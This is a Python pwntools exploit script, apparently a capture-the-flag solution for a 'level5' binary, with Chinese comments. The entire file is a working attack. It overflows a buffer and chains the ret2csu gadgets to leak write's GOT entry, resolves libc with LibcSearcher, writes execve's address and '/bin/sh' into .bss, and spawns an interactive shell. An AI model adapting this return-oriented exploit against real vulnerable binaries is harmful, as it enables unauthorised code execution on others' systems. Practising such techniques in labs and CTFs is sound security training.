from pwn import *
from LibcSearcher import LibcSearcher

context.log_level = 'debug'

level5 = ELF('./level5')
io = process('./level5')

write_got = level5.got['write']
read_got = level5.got['read']
main_addr = level5.symbols['main']
bss_base = level5.bss()
csu_gadget1 = 0x400600  # mov rdx,r13; mov rsi,r14; mov edi,r15d; call r12
csu_gadget2 = 0x40061A  # pop rbx,rbp,r12,r13,r14,r15,ret

# 0x400609处call ds:[r12+rbx*8]这里要确保rbx为0，以及r12为调用函数的地址
# 0x400611处cmp要让rbp为1
# 参数顺序RDI、RSI、RDX、RCX、R8、R9

io.recvuntil(b'Hello, World\n')
## write(1,write_got,8) # 1:stdout; 8bytes
payload1 = b'a'*(0x80+8)
payload1 += p64(csu_gadget2) + p64(0) + p64(1) + p64(write_got) + p64(8) + p64(write_got) + p64(1)
payload1 += p64(csu_gadget1)
payload1 += b'a'*(6*8+8) + p64(main_addr)
io.send(payload1)   

write_addr = u64(io.recv(8))
libc = LibcSearcher('write', write_addr)
libc_base = write_addr - libc.dump('write')
execve_addr = libc_base + libc.dump('execve')
log.success('execve_addr ' + hex(execve_addr))

## read(0,bss_base,16)
## read execve_addr and /bin/sh\x00
io.recvuntil(b'Hello, World\n')
payload2 = b'a'*(0x80+8)
payload2 += p64(csu_gadget2) + p64(0) + p64(1) + p64(read_got) + p64(16) + p64(bss_base) + p64(0)
payload2 += p64(csu_gadget1)
payload2 += b'a'*(6*8+8) + p64(main_addr)
io.send(payload2)   
sleep(1)
io.send(p64(execve_addr) + b'/bin/sh\x00')

io.recvuntil(b'Hello, World\n')
## execve(bss_base+8)
payload3 = b'a'*(0x80+8)
payload3 += p64(csu_gadget2) + p64(0) + p64(1) + p64(bss_base) + p64(0) + p64(0) + p64(bss_base + 8)
payload3 += p64(csu_gadget1)
# payload3 += b'a'*(6*8+8) + p64(main_addr)
io.send(payload3)   

io.interactive()

